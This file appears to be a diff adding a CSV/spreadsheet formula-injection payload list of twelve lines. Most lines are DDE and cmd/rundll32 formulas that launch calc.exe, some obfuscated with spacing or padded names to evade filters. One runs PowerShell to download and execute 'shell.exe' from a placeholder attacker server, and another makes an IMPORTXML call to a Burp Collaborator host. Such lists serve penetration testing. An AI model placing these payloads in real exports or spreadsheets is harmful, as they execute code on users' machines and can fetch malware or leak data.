@@ -1,0 +1,12 @@
+DDE ("cmd";"/C calc";"!A0")A0
+@SUM(1+1)*cmd|' /C calc'!A0
+=2+5+cmd|' /C calc'!A0
+=cmd|' /C calc'!'A1'
+=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
+=AAAA+BBBB-CCCC&"Hello"/12345&cmd|'/c calc.exe'!A
+=cmd|'/c calc.exe'!A*cmd|'/c calc.exe'!A
+=         cmd|'/c calc.exe'!A
+=rundll32|'URL.dll,OpenURL calc.exe'!A
+=rundll321234567890abcdefghijklmnopqrstuvwxyz|'URL.dll,OpenURL calc.exe'!A
+=    C    m D                    |        '/        c       c  al  c      .  e                  x       e  '   !   A
+=IMPORTXML("http://burp.collaborator.net/csv", "//a/@href")
